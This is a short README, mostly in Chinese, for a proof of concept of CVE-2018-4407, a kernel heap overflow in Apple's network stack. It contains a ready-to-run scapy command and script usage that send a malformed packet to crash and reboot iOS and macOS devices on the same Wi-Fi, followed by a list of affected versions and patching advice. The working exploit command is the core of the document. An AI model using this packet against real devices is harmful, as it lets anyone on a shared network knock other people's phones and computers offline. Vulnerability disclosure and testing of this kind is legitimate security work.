# check_icmp_dos

***iOS 12 / OS X *Remote Kernel Heap Overflow (CVE-2018-4407) POC：***
```
pip install scapy
sudo scapy 
send(IP(dst=“Target IP“,options=[IPOption(“A”*8)])/TCP(dport=2323,options=[(19, “1"*18),(19, “2”*18)]))

```

或使用脚本

```
python check_icmp_dos.py 127.0.0.1
```

该漏洞使得攻击者只要接入同一Wi-Fi网络，即可向其他毫不知情的用户发送恶意数据包来触发任何Mac或iOS设备的崩溃和重启。由于该漏洞存在于系统网络核心代码，因此任何反病毒软件均无法防御。

运行以下操作系统的设备易受攻击：
```
Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）

Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备（通过安全更新2018-001修复）

Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备（通过安全更新2018-005中修复）

Apple OS X El Capitan及更早版本：所有设备

```



# 修复建议

目前，苹果官方已经发布了ios12.1版本更新修复了该漏洞，建议用户及时确认系统版本，如受影响，请及时采取修补措施。漏洞修补措施如下：
1. 进行系统更新，更新到最新版本
2. 如果没有更新到最新版本，可在macOS防火墙中启用隐藏模式可防止攻击，这个系统设置默认情况下不启用，需要用户手动开启。
3. 不接入公共无线网络。触发该漏洞的唯一必要条件是处于同一网络，该漏洞不支持通过互联网发送恶意数据包而触发
